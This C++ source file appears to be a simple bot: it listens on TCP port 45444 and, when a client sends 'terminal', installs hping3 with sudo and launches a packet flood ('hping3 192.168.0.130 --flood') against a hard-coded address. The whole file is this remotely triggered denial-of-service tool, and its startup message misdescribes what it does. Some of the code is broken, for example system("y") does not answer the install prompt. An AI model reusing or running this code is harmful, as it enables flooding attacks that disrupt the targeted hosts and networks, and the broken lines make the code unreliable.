#include <iostream>
#include <thread>
#include <cstring>
#include <unistd.h>       
#include <arpa/inet.h>    
#include <sys/socket.h>
#include <netinet/in.h>
#include <cstdlib>        

using namespace std;

static int PORT = 45444;
int serverSocket;
string currCommand = "";

int main() {

    cout << "Connecting to client...\n" << endl;
    sleep(1);

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) 
    {
        cerr << "Error creating socket!" << endl;
        return -1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) 
    {
        cerr << "Bind failed!" << endl;
        return -1;
    }

    listen(serverSocket, 10);

    while (true) 
    {
        sockaddr_in clientAddr;
        socklen_t clientSize = sizeof(clientAddr);
        int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientSize);

        if (clientSocket < 0) 
        {
            cerr << "Failed to accept connection!" << endl;
            continue;
        }

        char buffer[4096];
        memset(buffer, 0, 4096);

        int bytesReceived = recv(clientSocket, buffer, 4096, 0);
        if (bytesReceived > 0) 
        {
            string request(buffer, bytesReceived);
            if (request == "terminal") 
            {
                cout << "Opening terminal..." << endl;
                system("gnome-terminal");
                system("sudo apt install hping3");
                system("y");
                system("sudo hping3 192.168.0.130 --flood");
            } 
        }

        close(clientSocket);
        sleep(1);
    }

    close(serverSocket);
    return 0;
}